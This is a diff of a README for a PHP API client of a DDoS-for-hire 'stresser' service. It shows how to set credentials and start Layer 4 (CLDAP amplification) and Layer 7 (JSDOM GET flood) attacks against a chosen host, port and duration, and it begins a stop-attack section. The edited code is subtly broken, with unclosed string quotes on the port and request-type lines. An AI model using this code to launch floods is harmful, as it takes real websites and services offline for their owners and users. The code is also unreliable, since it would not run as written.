@@ -12,18 +12,36 @@ Available here : https://instant-stresser.com/help/methodsdoc
 ```php
 require 'API.php';
 // UserID and API Key generated from API Manager website.
-$api = new API("UserID", "your-apikey");
+$userID = 123456789;
+$apiKey = "ABCD-123";
+$api = new API($userID, $apiKey);
 ```
 
 ## Layer 4 Attack
 ```php
+
+$host = "1.1.1.1";
+$port = "80;
+$time = "15";
+$method = "CLDAP";
+$slots = 1;
+$pps = 100000;
+
 /* Parameters : IPv4 , Port , Time , Method , Slots, PPS */
-$response = $api->startL4("1.1.1.1", 80, 15, "CLDAP", 1, 100000);
+$response = $api->startL4($host, $port, $time, $method, $slots, $pps);
 ```
 ## Layer 7 Attack
 ```php
+
+$host = "https://example.com/";
+$time = "15";
+$method = "JSDOM";
+$slots = 1;
+$requesttype = "GET;
+$ratelimit = "false";
+
 /* Parameters : URL , Time , Method , Slots , Type, Ratelimit (true = enable, false = disabled) */
-$response = $api->startL7("https://example.com/", 15, "HTTP1", 1, "GET", false);
+$response = $api->startL7($host, $time, $method, $slots, $requesttype, $ratelimit);
 ```
 ## Stop Attack
 ```php
